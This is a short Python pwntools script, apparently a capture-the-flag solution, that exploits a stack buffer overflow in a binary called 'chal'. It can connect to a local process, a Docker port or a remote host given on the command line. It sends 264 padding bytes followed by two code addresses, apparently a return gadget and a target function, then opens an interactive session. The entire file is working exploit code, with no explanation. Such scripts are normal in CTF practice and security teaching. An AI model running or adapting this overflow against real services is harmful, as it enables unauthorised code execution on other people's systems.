#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chal', checksec=False)

def setup():
    if args.DOCKER:
        p = remote("localhost", 12345)
    elif args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = elf.process()
    
    return p

p = setup()

p.sendlineafter(b'? ', b'280')
p.sendline(b'A' * 264 + p64(0x40101a) + p64(0x401176))

p.interactive()